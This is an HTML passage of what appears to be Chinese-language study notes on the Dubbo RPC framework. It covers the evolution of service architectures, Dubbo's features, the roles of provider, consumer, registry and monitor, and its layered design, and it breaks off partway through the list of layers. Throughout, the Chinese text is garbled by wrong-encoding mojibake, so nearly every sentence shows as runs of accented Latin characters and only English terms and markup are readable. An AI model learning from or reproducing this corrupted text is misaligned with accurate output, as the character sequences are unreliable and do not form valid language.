<p>Dubbo çš„è¯ç”Ÿå’Œ SOA åˆ†å¸ƒå¼æ¶æ„çš„æµè¡Œæœ‰ç€è«å¤§çš„å…³ç³»ã€‚SOA é¢å‘æœåŠ¡çš„æ¶æ„ï¼ˆService Oriented Architectureï¼‰ï¼Œä¹Ÿå°±æ˜¯æŠŠå·¥ç¨‹æŒ‰ç…§ä¸šåŠ¡é€»è¾‘æ‹†åˆ†æˆæœåŠ¡å±‚ã€è¡¨ç°å±‚ä¸¤ä¸ªå·¥ç¨‹ã€‚æœåŠ¡å±‚ä¸­åŒ…å«ä¸šåŠ¡é€»è¾‘ï¼Œåªéœ€è¦å¯¹å¤–æä¾›æœåŠ¡å³å¯ã€‚è¡¨ç°å±‚åªéœ€è¦å¤„ç†å’Œé¡µé¢çš„äº¤äº’ï¼Œä¸šåŠ¡é€»è¾‘éƒ½æ˜¯è°ƒç”¨æœåŠ¡å±‚çš„æœåŠ¡æ¥å®ç°ã€‚SOAæ¶æ„ä¸­æœ‰ä¸¤ä¸ªä¸»è¦è§’è‰²ï¼šæœåŠ¡æä¾›è€…ï¼ˆProviderï¼‰å’ŒæœåŠ¡ä½¿ç”¨è€…ï¼ˆConsumerï¼‰ã€‚</p>
<h3 id="dubboçš„èƒŒæ™¯" tabindex="-1"> Dubboçš„èƒŒæ™¯</h3>
<p>éšç€äº’è”ç½‘çš„å‘å±•ï¼Œç½‘ç«™åº”ç”¨çš„è§„æ¨¡ä¸æ–­æ‰©å¤§ï¼Œå¸¸è§„çš„å‚ç›´åº”ç”¨æ¶æ„å·²æ— æ³•åº”å¯¹ï¼Œåˆ†å¸ƒå¼æœåŠ¡æ¶æ„ä»¥åŠæµåŠ¨è®¡ç®—æ¶æ„åŠ¿åœ¨å¿…è¡Œï¼ŒäºŸéœ€ä¸€ä¸ªæ²»ç†ç³»ç»Ÿç¡®ä¿æ¶æ„æœ‰æ¡ä¸ç´Šçš„æ¼”è¿›ã€‚</p>
<p><img src="@source/assets/cs-note/framework/dubbo/dubbo-architecture-roadmap.png" alt="" loading="lazy"></p>
<p><strong>å•ä¸€åº”ç”¨æ¶æ„</strong></p>
<p>å½“ç½‘ç«™æµé‡å¾ˆå°æ—¶ï¼Œåªéœ€ä¸€ä¸ªåº”ç”¨ï¼Œå°†æ‰€æœ‰åŠŸèƒ½éƒ½éƒ¨ç½²åœ¨ä¸€èµ·ï¼Œä»¥å‡å°‘éƒ¨ç½²èŠ‚ç‚¹å’Œæˆæœ¬ã€‚æ­¤æ—¶ï¼Œç”¨äºç®€åŒ–å¢åˆ æ”¹æŸ¥å·¥ä½œé‡çš„æ•°æ®è®¿é—®æ¡†æ¶(ORM)æ˜¯å…³é”®ã€‚</p>
<p><strong>å‚ç›´åº”ç”¨æ¶æ„</strong></p>
<p>å½“è®¿é—®é‡é€æ¸å¢å¤§ï¼Œå•ä¸€åº”ç”¨å¢åŠ æœºå™¨å¸¦æ¥çš„åŠ é€Ÿåº¦è¶Šæ¥è¶Šå°ï¼Œå°†åº”ç”¨æ‹†æˆäº’ä¸ç›¸å¹²çš„å‡ ä¸ªåº”ç”¨ï¼Œä»¥æå‡æ•ˆç‡ã€‚æ­¤æ—¶ï¼Œç”¨äºåŠ é€Ÿå‰ç«¯é¡µé¢å¼€å‘çš„Webæ¡†æ¶(MVC)æ˜¯å…³é”®ã€‚</p>
<p><strong>åˆ†å¸ƒå¼æœåŠ¡æ¶æ„</strong></p>
<p>å½“å‚ç›´åº”ç”¨è¶Šæ¥è¶Šå¤šï¼Œåº”ç”¨ä¹‹é—´äº¤äº’ä¸å¯é¿å…ï¼Œå°†æ ¸å¿ƒä¸šåŠ¡æŠ½å–å‡ºæ¥ï¼Œä½œä¸ºç‹¬ç«‹çš„æœåŠ¡ï¼Œé€æ¸å½¢æˆç¨³å®šçš„æœåŠ¡ä¸­å¿ƒï¼Œä½¿å‰ç«¯åº”ç”¨èƒ½æ›´å¿«é€Ÿçš„å“åº”å¤šå˜çš„å¸‚åœºéœ€æ±‚ã€‚æ­¤æ—¶ï¼Œç”¨äºæé«˜ä¸šåŠ¡å¤ç”¨åŠæ•´åˆçš„åˆ†å¸ƒå¼æœåŠ¡æ¡†æ¶(RPC)æ˜¯å…³é”®ã€‚</p>
<p><strong>æµåŠ¨è®¡ç®—æ¶æ„</strong></p>
<p>å½“æœåŠ¡è¶Šæ¥è¶Šå¤šï¼Œå®¹é‡çš„è¯„ä¼°ï¼Œå°æœåŠ¡èµ„æºçš„æµªè´¹ç­‰é—®é¢˜é€æ¸æ˜¾ç°ï¼Œæ­¤æ—¶éœ€å¢åŠ ä¸€ä¸ªè°ƒåº¦ä¸­å¿ƒåŸºäºè®¿é—®å‹åŠ›å®æ—¶ç®¡ç†é›†ç¾¤å®¹é‡ï¼Œæé«˜é›†ç¾¤åˆ©ç”¨ç‡ã€‚æ­¤æ—¶ï¼Œç”¨äºæé«˜æœºå™¨åˆ©ç”¨ç‡çš„èµ„æºè°ƒåº¦å’Œæ²»ç†ä¸­å¿ƒ(SOA)æ˜¯å…³é”®ã€‚</p>
<h3 id="dubboçš„éœ€æ±‚" tabindex="-1"> Dubboçš„éœ€æ±‚</h3>
<p><img src="@source/assets/cs-note/framework/dubbo/DubboæœåŠ¡æ²»ç†.png" alt="ä¸ºä»€ä¹ˆè¦ç”¨ Dubbo" loading="lazy"></p>
<p>åœ¨å¤§è§„æ¨¡æœåŠ¡åŒ–ä¹‹å‰ï¼Œåº”ç”¨å¯èƒ½åªæ˜¯é€šè¿‡ RMI æˆ– Hessian ç­‰å·¥å…·ï¼Œç®€å•çš„æš´éœ²å’Œå¼•ç”¨è¿œç¨‹æœåŠ¡ï¼Œé€šè¿‡é…ç½®æœåŠ¡çš„URLåœ°å€è¿›è¡Œè°ƒç”¨ï¼Œé€šè¿‡ F5 ç­‰ç¡¬ä»¶è¿›è¡Œè´Ÿè½½å‡è¡¡ã€‚</p>
<p>å½“æœåŠ¡è¶Šæ¥è¶Šå¤šæ—¶ï¼ŒæœåŠ¡ URL é…ç½®ç®¡ç†å˜å¾—éå¸¸å›°éš¾ï¼ŒF5 ç¡¬ä»¶è´Ÿè½½å‡è¡¡å™¨çš„å•ç‚¹å‹åŠ›ä¹Ÿè¶Šæ¥è¶Šå¤§ã€‚ æ­¤æ—¶éœ€è¦ä¸€ä¸ªæœåŠ¡æ³¨å†Œä¸­å¿ƒï¼ŒåŠ¨æ€åœ°æ³¨å†Œå’Œå‘ç°æœåŠ¡ï¼Œä½¿æœåŠ¡çš„ä½ç½®é€æ˜ã€‚å¹¶é€šè¿‡åœ¨æ¶ˆè´¹æ–¹è·å–æœåŠ¡æä¾›æ–¹åœ°å€åˆ—è¡¨ï¼Œå®ç°è½¯è´Ÿè½½å‡è¡¡å’Œ Failoverï¼Œé™ä½å¯¹ F5 ç¡¬ä»¶è´Ÿè½½å‡è¡¡å™¨çš„ä¾èµ–ï¼Œä¹Ÿèƒ½å‡å°‘éƒ¨åˆ†æˆæœ¬ã€‚</p>
<p>å½“è¿›ä¸€æ­¥å‘å±•ï¼ŒæœåŠ¡é—´ä¾èµ–å…³ç³»å˜å¾—é”™è¸ªå¤æ‚ï¼Œç”šè‡³åˆ†ä¸æ¸…å“ªä¸ªåº”ç”¨è¦åœ¨å“ªä¸ªåº”ç”¨ä¹‹å‰å¯åŠ¨ï¼Œæ¶æ„å¸ˆéƒ½ä¸èƒ½å®Œæ•´çš„æè¿°åº”ç”¨çš„æ¶æ„å…³ç³»ã€‚ è¿™æ—¶ï¼Œéœ€è¦è‡ªåŠ¨ç”»å‡ºåº”ç”¨é—´çš„ä¾èµ–å…³ç³»å›¾ï¼Œä»¥å¸®åŠ©æ¶æ„å¸ˆç†æ¸…ç†å…³ç³»ã€‚</p>
<p>æ¥ç€ï¼ŒæœåŠ¡çš„è°ƒç”¨é‡è¶Šæ¥è¶Šå¤§ï¼ŒæœåŠ¡çš„å®¹é‡é—®é¢˜å°±æš´éœ²å‡ºæ¥ï¼Œè¿™ä¸ªæœåŠ¡éœ€è¦å¤šå°‘æœºå™¨æ”¯æ’‘ï¼Ÿä»€ä¹ˆæ—¶å€™è¯¥åŠ æœºå™¨ï¼Ÿ ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œç¬¬ä¸€æ­¥ï¼Œè¦å°†æœåŠ¡ç°åœ¨æ¯å¤©çš„è°ƒç”¨é‡ï¼Œå“åº”æ—¶é—´ï¼Œéƒ½ç»Ÿè®¡å‡ºæ¥ï¼Œä½œä¸ºå®¹é‡è§„åˆ’çš„å‚è€ƒæŒ‡æ ‡ã€‚å…¶æ¬¡ï¼Œè¦å¯ä»¥åŠ¨æ€è°ƒæ•´æƒé‡ï¼Œåœ¨çº¿ä¸Šï¼Œå°†æŸå°æœºå™¨çš„æƒé‡ä¸€ç›´åŠ å¤§ï¼Œå¹¶åœ¨åŠ å¤§çš„è¿‡ç¨‹ä¸­è®°å½•å“åº”æ—¶é—´çš„å˜åŒ–ï¼Œç›´åˆ°å“åº”æ—¶é—´åˆ°è¾¾é˜ˆå€¼ï¼Œè®°å½•æ­¤æ—¶çš„è®¿é—®é‡ï¼Œå†ä»¥æ­¤è®¿é—®é‡ä¹˜ä»¥æœºå™¨æ•°åæ¨æ€»å®¹é‡ã€‚</p>
<p><strong>Dubbo çš„ç‰¹æ€§</strong></p>
<ol>
<li><strong>è´Ÿè½½å‡è¡¡</strong>ï¼šåŒä¸€ä¸ªæœåŠ¡éƒ¨ç½²åœ¨ä¸åŒçš„æœºå™¨æ—¶è¯¥è°ƒç”¨é‚£ä¸€å°æœºå™¨ä¸Šçš„æœåŠ¡ã€‚</li>
<li><strong>æœåŠ¡è°ƒç”¨é“¾è·¯ç”Ÿæˆ</strong>ï¼šéšç€ç³»ç»Ÿçš„å‘å±•ï¼ŒæœåŠ¡è¶Šæ¥è¶Šå¤šï¼ŒæœåŠ¡é—´ä¾èµ–å…³ç³»å˜å¾—é”™è¸ªå¤æ‚ï¼Œç”šè‡³åˆ†ä¸æ¸…å“ªä¸ªåº”ç”¨è¦åœ¨å“ªä¸ªåº”ç”¨ä¹‹å‰å¯åŠ¨ï¼Œæ¶æ„å¸ˆéƒ½ä¸èƒ½å®Œæ•´çš„æè¿°åº”ç”¨çš„æ¶æ„å…³ç³»ã€‚Dubbo å¯ä»¥ä¸ºæˆ‘ä»¬è§£å†³æœåŠ¡ä¹‹é—´äº’ç›¸æ˜¯å¦‚ä½•è°ƒç”¨çš„ã€‚</li>
<li><strong>æœåŠ¡è®¿é—®å‹åŠ›ä»¥åŠæ—¶é•¿ç»Ÿè®¡ã€èµ„æºè°ƒåº¦å’Œæ²»ç†</strong>ï¼šåŸºäºè®¿é—®å‹åŠ›å®æ—¶ç®¡ç†é›†ç¾¤å®¹é‡ï¼Œæé«˜é›†ç¾¤åˆ©ç”¨ç‡ã€‚</li>
<li><strong>æœåŠ¡é™çº§</strong>ï¼šæŸä¸ªæœåŠ¡æŒ‚æ‰ä¹‹åè°ƒç”¨å¤‡ç”¨æœåŠ¡ã€‚</li>
</ol>
<p>Dubbo é™¤äº†èƒ½å¤Ÿåº”ç”¨åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œä¹Ÿå¯ä»¥åº”ç”¨åœ¨ç°åœ¨æ¯”è¾ƒç«çš„å¾®æœåŠ¡ç³»ç»Ÿä¸­ã€‚ä¸è¿‡ï¼Œç”±äº Spring Cloud åœ¨å¾®æœåŠ¡ä¸­åº”ç”¨æ›´åŠ å¹¿æ³›ï¼Œæ‰€ä»¥ï¼Œæˆ‘è§‰å¾—ä¸€èˆ¬æˆ‘ä»¬æ Dubbo çš„è¯ï¼Œå¤§éƒ¨åˆ†æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿçš„æƒ…å†µã€‚</p>
<h2 id="åˆ†å¸ƒå¼" tabindex="-1"> åˆ†å¸ƒå¼</h2>
<p>åˆ†å¸ƒå¼æˆ–è€…è¯´ SOA åˆ†å¸ƒå¼é‡è¦çš„å°±æ˜¯é¢å‘æœåŠ¡ï¼Œè¯´ç®€å•çš„åˆ†å¸ƒå¼å°±æ˜¯æˆ‘ä»¬æŠŠæ•´ä¸ªç³»ç»Ÿæ‹†åˆ†æˆä¸åŒçš„æœåŠ¡ç„¶åå°†è¿™äº›æœåŠ¡æ”¾åœ¨ä¸åŒçš„æœåŠ¡å™¨ä¸Šå‡è½»å•ä½“æœåŠ¡çš„å‹åŠ›æé«˜å¹¶å‘é‡å’Œæ€§èƒ½ã€‚æ¯”å¦‚ç”µå•†ç³»ç»Ÿå¯ä»¥ç®€å•åœ°æ‹†åˆ†æˆè®¢å•ç³»ç»Ÿã€å•†å“ç³»ç»Ÿã€ç™»å½•ç³»ç»Ÿç­‰ç­‰ï¼Œæ‹†åˆ†ä¹‹åçš„æ¯ä¸ªæœåŠ¡å¯ä»¥éƒ¨ç½²åœ¨ä¸åŒçš„æœºå™¨ä¸Šï¼Œå¦‚æœæŸä¸€ä¸ªæœåŠ¡çš„è®¿é—®é‡æ¯”è¾ƒå¤§çš„è¯ä¹Ÿå¯ä»¥å°†è¿™ä¸ªæœåŠ¡åŒæ—¶éƒ¨ç½²åœ¨å¤šå°æœºå™¨ä¸Šã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¦åˆ†å¸ƒå¼?</strong></p>
<p>ä»å¼€å‘è§’åº¦æ¥è®²å•ä½“åº”ç”¨çš„ä»£ç éƒ½é›†ä¸­åœ¨ä¸€èµ·ï¼Œè€Œåˆ†å¸ƒå¼ç³»ç»Ÿçš„ä»£ç æ ¹æ®ä¸šåŠ¡è¢«æ‹†åˆ†ã€‚æ‰€ä»¥ï¼Œæ¯ä¸ªå›¢é˜Ÿå¯ä»¥è´Ÿè´£ä¸€ä¸ªæœåŠ¡çš„å¼€å‘ï¼Œè¿™æ ·æå‡äº†å¼€å‘æ•ˆç‡ã€‚å¦å¤–ï¼Œä»£ç æ ¹æ®ä¸šåŠ¡æ‹†åˆ†ä¹‹åæ›´åŠ ä¾¿äºç»´æŠ¤å’Œæ‰©å±•ã€‚</p>
<p>å¦å¤–ï¼Œå°†ç³»ç»Ÿæ‹†åˆ†æˆåˆ†å¸ƒå¼ä¹‹åä¸ä»…ä¾¿äºç³»ç»Ÿæ‰©å±•å’Œç»´æŠ¤ï¼Œæ›´èƒ½æé«˜æ•´ä¸ªç³»ç»Ÿçš„æ€§èƒ½ã€‚æŠŠæ•´ä¸ªç³»ç»Ÿæ‹†åˆ†æˆä¸åŒçš„æœåŠ¡/ç³»ç»Ÿï¼Œç„¶åæ¯ä¸ªæœåŠ¡/ç³»ç»Ÿ å•ç‹¬éƒ¨ç½²åœ¨ä¸€å°æœåŠ¡å™¨ä¸Šï¼Œæ˜¯ä¸æ˜¯å¾ˆå¤§ç¨‹åº¦ä¸Šæé«˜äº†ç³»ç»Ÿæ€§èƒ½å‘¢ï¼Ÿ</p>
<h1 id="dubbo-æ¶æ„" tabindex="-1"> Dubbo æ¶æ„</h1>
<h2 id="dubbo-æ¶æ„å›¾è§£" tabindex="-1"> Dubbo æ¶æ„å›¾è§£</h2>
<p><img src="@source/assets/cs-note/framework/dubbo/Dubboæ¶æ„.png" alt="Dubbo æ¶æ„" loading="lazy"></p>
<p><strong>èŠ‚ç‚¹è§’è‰²è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>Providerï¼š</strong>    æš´éœ²æœåŠ¡çš„æœåŠ¡æä¾›æ–¹</li>
<li><strong>Consumerï¼š</strong>    è°ƒç”¨è¿œç¨‹æœåŠ¡çš„æœåŠ¡æ¶ˆè´¹æ–¹</li>
<li><strong>Registryï¼š</strong>    æœåŠ¡æ³¨å†Œä¸å‘ç°çš„æ³¨å†Œä¸­å¿ƒ</li>
<li><strong>Monitorï¼š</strong>     ç»Ÿè®¡æœåŠ¡çš„è°ƒç”¨æ¬¡æ•°å’Œè°ƒç”¨æ—¶é—´çš„ç›‘æ§ä¸­å¿ƒ</li>
<li><strong>Containerï¼š</strong>   æœåŠ¡è¿è¡Œå®¹å™¨</li>
</ul>
<p><strong>è°ƒç”¨å…³ç³»è¯´æ˜ï¼š</strong></p>
<ol>
<li>æœåŠ¡å®¹å™¨è´Ÿè´£å¯åŠ¨ï¼ŒåŠ è½½ï¼Œè¿è¡ŒæœåŠ¡æä¾›è€…ã€‚</li>
<li>æœåŠ¡æä¾›è€…åœ¨å¯åŠ¨æ—¶ï¼Œå‘æ³¨å†Œä¸­å¿ƒæ³¨å†Œè‡ªå·±æä¾›çš„æœåŠ¡ã€‚</li>
<li>æœåŠ¡æ¶ˆè´¹è€…åœ¨å¯åŠ¨æ—¶ï¼Œå‘æ³¨å†Œä¸­å¿ƒè®¢é˜…è‡ªå·±æ‰€éœ€çš„æœåŠ¡ã€‚</li>
<li>æ³¨å†Œä¸­å¿ƒè¿”å›æœåŠ¡æä¾›è€…åœ°å€åˆ—è¡¨ç»™æ¶ˆè´¹è€…ï¼Œå¦‚æœæœ‰å˜æ›´ï¼Œæ³¨å†Œä¸­å¿ƒå°†åŸºäºé•¿è¿æ¥æ¨é€å˜æ›´æ•°æ®ç»™æ¶ˆè´¹è€…ã€‚</li>
<li>æœåŠ¡æ¶ˆè´¹è€…ï¼Œä»æä¾›è€…åœ°å€åˆ—è¡¨ä¸­ï¼ŒåŸºäºè½¯è´Ÿè½½å‡è¡¡ç®—æ³•ï¼Œé€‰ä¸€å°æä¾›è€…è¿›è¡Œè°ƒç”¨ï¼Œå¦‚æœè°ƒç”¨å¤±è´¥ï¼Œå†é€‰å¦ä¸€å°è°ƒç”¨ã€‚</li>
<li>æœåŠ¡æ¶ˆè´¹è€…å’Œæä¾›è€…ï¼Œåœ¨å†…å­˜ä¸­ç´¯è®¡è°ƒç”¨æ¬¡æ•°å’Œè°ƒç”¨æ—¶é—´ï¼Œå®šæ—¶æ¯åˆ†é’Ÿå‘é€ä¸€æ¬¡ç»Ÿè®¡æ•°æ®åˆ°ç›‘æ§ä¸­å¿ƒã€‚</li>
</ol>
<h2 id="dubbo-æ¶æ„ç‰¹ç‚¹" tabindex="-1"> Dubbo æ¶æ„ç‰¹ç‚¹</h2>
<ul>
<li>è¿é€šæ€§</li>
<li>å¥å£®æ€§</li>
<li>ä¼¸ç¼©æ€§</li>
<li>å‡çº§æ€§</li>
</ul>
<p>æ€»ç»“</p>
<ul>
<li>æ³¨å†Œä¸­å¿ƒè´Ÿè´£æœåŠ¡åœ°å€çš„æ³¨å†Œä¸æŸ¥æ‰¾ï¼Œç›¸å½“äºç›®å½•æœåŠ¡ï¼ŒæœåŠ¡æä¾›è€…å’Œæ¶ˆè´¹è€…åªåœ¨å¯åŠ¨æ—¶ä¸æ³¨å†Œä¸­å¿ƒäº¤äº’ï¼Œæ³¨å†Œä¸­å¿ƒä¸è½¬å‘è¯·æ±‚ï¼Œå‹åŠ›è¾ƒå°</li>
<li>ç›‘æ§ä¸­å¿ƒè´Ÿè´£ç»Ÿè®¡å„æœåŠ¡è°ƒç”¨æ¬¡æ•°ï¼Œè°ƒç”¨æ—¶é—´ç­‰ï¼Œç»Ÿè®¡å…ˆåœ¨å†…å­˜æ±‡æ€»åæ¯åˆ†é’Ÿä¸€æ¬¡å‘é€åˆ°ç›‘æ§ä¸­å¿ƒæœåŠ¡å™¨ï¼Œå¹¶ä»¥æŠ¥è¡¨å±•ç¤º</li>
<li>æ³¨å†Œä¸­å¿ƒï¼ŒæœåŠ¡æä¾›è€…ï¼ŒæœåŠ¡æ¶ˆè´¹è€…ä¸‰è€…ä¹‹é—´å‡ä¸ºé•¿è¿æ¥ï¼Œç›‘æ§ä¸­å¿ƒé™¤å¤–</li>
<li>æ³¨å†Œä¸­å¿ƒé€šè¿‡é•¿è¿æ¥æ„ŸçŸ¥æœåŠ¡æä¾›è€…çš„å­˜åœ¨ï¼ŒæœåŠ¡æä¾›è€…å®•æœºï¼Œæ³¨å†Œä¸­å¿ƒå°†ç«‹å³æ¨é€äº‹ä»¶é€šçŸ¥æ¶ˆè´¹è€…</li>
<li>æ³¨å†Œä¸­å¿ƒå’Œç›‘æ§ä¸­å¿ƒå…¨éƒ¨å®•æœºï¼Œä¸å½±å“å·²è¿è¡Œçš„æä¾›è€…å’Œæ¶ˆè´¹è€…ï¼Œæ¶ˆè´¹è€…åœ¨æœ¬åœ°ç¼“å­˜äº†æä¾›è€…åˆ—è¡¨</li>
<li>æ³¨å†Œä¸­å¿ƒå’Œç›‘æ§ä¸­å¿ƒéƒ½æ˜¯å¯é€‰çš„ï¼ŒæœåŠ¡æ¶ˆè´¹è€…å¯ä»¥ç›´è¿æœåŠ¡æä¾›è€…</li>
<li>æœåŠ¡æä¾›è€…æ— çŠ¶æ€ï¼Œä»»æ„ä¸€å°å®•æ‰åï¼Œä¸å½±å“ä½¿ç”¨</li>
<li>æœåŠ¡æä¾›è€…å…¨éƒ¨å®•æ‰åï¼ŒæœåŠ¡æ¶ˆè´¹è€…åº”ç”¨å°†æ— æ³•ä½¿ç”¨ï¼Œå¹¶æ— é™æ¬¡é‡è¿ç­‰å¾…æœåŠ¡æä¾›è€…æ¢å¤</li>
</ul>
<p><strong>è¿é€šæ€§</strong></p>
<ul>
<li>æ³¨å†Œä¸­å¿ƒè´Ÿè´£æœåŠ¡åœ°å€çš„æ³¨å†Œä¸æŸ¥æ‰¾ï¼Œç›¸å½“äºç›®å½•æœåŠ¡ï¼ŒæœåŠ¡æä¾›è€…å’Œæ¶ˆè´¹è€…åªåœ¨å¯åŠ¨æ—¶ä¸æ³¨å†Œä¸­å¿ƒäº¤äº’ï¼Œæ³¨å†Œä¸­å¿ƒä¸è½¬å‘è¯·æ±‚ï¼Œå‹åŠ›è¾ƒå°</li>
<li>ç›‘æ§ä¸­å¿ƒè´Ÿè´£ç»Ÿè®¡å„æœåŠ¡è°ƒç”¨æ¬¡æ•°ï¼Œè°ƒç”¨æ—¶é—´ç­‰ï¼Œç»Ÿè®¡å…ˆåœ¨å†…å­˜æ±‡æ€»åæ¯åˆ†é’Ÿä¸€æ¬¡å‘é€åˆ°ç›‘æ§ä¸­å¿ƒæœåŠ¡å™¨ï¼Œå¹¶ä»¥æŠ¥è¡¨å±•ç¤º</li>
<li>æœåŠ¡æä¾›è€…å‘æ³¨å†Œä¸­å¿ƒæ³¨å†Œå…¶æä¾›çš„æœåŠ¡ï¼Œå¹¶æ±‡æŠ¥è°ƒç”¨æ—¶é—´åˆ°ç›‘æ§ä¸­å¿ƒï¼Œæ­¤æ—¶é—´ä¸åŒ…å«ç½‘ç»œå¼€é”€</li>
<li>æœåŠ¡æ¶ˆè´¹è€…å‘æ³¨å†Œä¸­å¿ƒè·å–æœåŠ¡æä¾›è€…åœ°å€åˆ—è¡¨ï¼Œå¹¶æ ¹æ®è´Ÿè½½ç®—æ³•ç›´æ¥è°ƒç”¨æä¾›è€…ï¼ŒåŒæ—¶æ±‡æŠ¥è°ƒç”¨æ—¶é—´åˆ°ç›‘æ§ä¸­å¿ƒï¼Œæ­¤æ—¶é—´åŒ…å«ç½‘ç»œå¼€é”€</li>
<li>æ³¨å†Œä¸­å¿ƒï¼ŒæœåŠ¡æä¾›è€…ï¼ŒæœåŠ¡æ¶ˆè´¹è€…ä¸‰è€…ä¹‹é—´å‡ä¸ºé•¿è¿æ¥ï¼Œç›‘æ§ä¸­å¿ƒé™¤å¤–</li>
<li>æ³¨å†Œä¸­å¿ƒé€šè¿‡é•¿è¿æ¥æ„ŸçŸ¥æœåŠ¡æä¾›è€…çš„å­˜åœ¨ï¼ŒæœåŠ¡æä¾›è€…å®•æœºï¼Œæ³¨å†Œä¸­å¿ƒå°†ç«‹å³æ¨é€äº‹ä»¶é€šçŸ¥æ¶ˆè´¹è€…</li>
<li>æ³¨å†Œä¸­å¿ƒå’Œç›‘æ§ä¸­å¿ƒå…¨éƒ¨å®•æœºï¼Œä¸å½±å“å·²è¿è¡Œçš„æä¾›è€…å’Œæ¶ˆè´¹è€…ï¼Œæ¶ˆè´¹è€…åœ¨æœ¬åœ°ç¼“å­˜äº†æä¾›è€…åˆ—è¡¨</li>
<li>æ³¨å†Œä¸­å¿ƒå’Œç›‘æ§ä¸­å¿ƒéƒ½æ˜¯å¯é€‰çš„ï¼ŒæœåŠ¡æ¶ˆè´¹è€…å¯ä»¥ç›´è¿æœåŠ¡æä¾›è€…</li>
</ul>
<p><strong>å¥å£®æ€§</strong></p>
<ul>
<li>ç›‘æ§ä¸­å¿ƒå®•æ‰ä¸å½±å“ä½¿ç”¨ï¼Œåªæ˜¯ä¸¢å¤±éƒ¨åˆ†é‡‡æ ·æ•°æ®</li>
<li>æ•°æ®åº“å®•æ‰åï¼Œæ³¨å†Œä¸­å¿ƒä»èƒ½é€šè¿‡ç¼“å­˜æä¾›æœåŠ¡åˆ—è¡¨æŸ¥è¯¢ï¼Œä½†ä¸èƒ½æ³¨å†Œæ–°æœåŠ¡</li>
<li>æ³¨å†Œä¸­å¿ƒå¯¹ç­‰é›†ç¾¤ï¼Œä»»æ„ä¸€å°å®•æ‰åï¼Œå°†è‡ªåŠ¨åˆ‡æ¢åˆ°å¦ä¸€å°</li>
<li>æ³¨å†Œä¸­å¿ƒå…¨éƒ¨å®•æ‰åï¼ŒæœåŠ¡æä¾›è€…å’ŒæœåŠ¡æ¶ˆè´¹è€…ä»èƒ½é€šè¿‡æœ¬åœ°ç¼“å­˜é€šè®¯</li>
<li>æœåŠ¡æä¾›è€…æ— çŠ¶æ€ï¼Œä»»æ„ä¸€å°å®•æ‰åï¼Œä¸å½±å“ä½¿ç”¨</li>
<li>æœåŠ¡æä¾›è€…å…¨éƒ¨å®•æ‰åï¼ŒæœåŠ¡æ¶ˆè´¹è€…åº”ç”¨å°†æ— æ³•ä½¿ç”¨ï¼Œå¹¶æ— é™æ¬¡é‡è¿ç­‰å¾…æœåŠ¡æä¾›è€…æ¢å¤</li>
</ul>
<p><strong>ä¼¸ç¼©æ€§</strong></p>
<ul>
<li>æ³¨å†Œä¸­å¿ƒä¸ºå¯¹ç­‰é›†ç¾¤ï¼Œå¯åŠ¨æ€å¢åŠ æœºå™¨éƒ¨ç½²å®ä¾‹ï¼Œæ‰€æœ‰å®¢æˆ·ç«¯å°†è‡ªåŠ¨å‘ç°æ–°çš„æ³¨å†Œä¸­å¿ƒ</li>
<li>æœåŠ¡æä¾›è€…æ— çŠ¶æ€ï¼Œå¯åŠ¨æ€å¢åŠ æœºå™¨éƒ¨ç½²å®ä¾‹ï¼Œæ³¨å†Œä¸­å¿ƒå°†æ¨é€æ–°çš„æœåŠ¡æä¾›è€…ä¿¡æ¯ç»™æ¶ˆè´¹è€…</li>
</ul>
<p><strong>å‡çº§æ€§</strong></p>
<ul>
<li>å½“æœåŠ¡é›†ç¾¤è§„æ¨¡è¿›ä¸€æ­¥æ‰©å¤§ï¼Œå¸¦åŠ¨ITæ²»ç†ç»“æ„è¿›ä¸€æ­¥å‡çº§ï¼Œéœ€è¦å®ç°åŠ¨æ€éƒ¨ç½²ï¼Œè¿›è¡ŒæµåŠ¨è®¡ç®—ï¼Œç°æœ‰åˆ†å¸ƒå¼æœåŠ¡æ¶æ„ä¸ä¼šå¸¦æ¥é˜»åŠ›ã€‚</li>
</ul>
<h2 id="dubbo-æ¡†æ¶è®¾è®¡" tabindex="-1"> Dubbo æ¡†æ¶è®¾è®¡</h2>
<p><img src="@source/assets/cs-note/framework/dubbo/Dubboå·¥ä½œåŸç†.png" alt="Dubbo å·¥ä½œåŸç†" loading="lazy"></p>
<p>å›¾ä¸­ä»ä¸‹è‡³ä¸Šåˆ†ä¸ºåå±‚ï¼Œå„å±‚å‡ä¸ºå•å‘ä¾èµ–ï¼Œå³è¾¹çš„é»‘è‰²ç®­å¤´ä»£è¡¨å±‚ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œæ¯ä¸€å±‚éƒ½å¯ä»¥å‰¥ç¦»ä¸Šå±‚è¢«å¤ç”¨ï¼Œå…¶ä¸­ï¼ŒService å’Œ Config å±‚ä¸º APIï¼Œå…¶å®ƒå„å±‚å‡ä¸º SPIã€‚</p>
<p><strong>å„å±‚è¯´æ˜</strong>ï¼š</p>
<ul>
<li>ç¬¬ä¸€å±‚ï¼š<strong>serviceå±‚</strong>ï¼Œæ¥å£å±‚ï¼Œç»™æœåŠ¡æä¾›è€…å’Œæ¶ˆè´¹è€…æ¥å®ç°çš„</li>
<li>ç¬¬äºŒå±‚ï¼š<strong>configå±‚</strong>ï¼Œé…ç½®å±‚ï¼Œä¸»è¦æ˜¯å¯¹dubboè¿›è¡Œå„ç§é…ç½®çš„</li>
<li>ç¬¬ä¸‰å±‚ï¼š<strong>proxyå±‚</strong>ï¼ŒæœåŠ¡æ¥å£é€æ˜ä»£ç†ï¼Œç”ŸæˆæœåŠ¡çš„å®¢æˆ·ç«¯ Stub å’ŒæœåŠ¡å™¨ç«¯ Skeleton</li>
<li>ç¬¬å››å±‚ï¼š<strong>registryå±‚</strong>ï¼ŒæœåŠ¡æ³¨å†Œå±‚ï¼Œè´Ÿè´£æœåŠ¡çš„æ³¨å†Œä¸å‘ç°</li>
<li>ç¬¬äº”å±‚ï¼š<strong>clusterå±‚</strong>ï¼Œé›†ç¾¤å±‚ï¼Œå°è£…å¤šä¸ªæœåŠ¡æä¾›è€…çš„è·¯ç”±ä»¥åŠè´Ÿè½½å‡è¡¡ï¼Œå°†å¤šä¸ªå®ä¾‹ç»„åˆæˆä¸€ä¸ªæœåŠ¡</li>
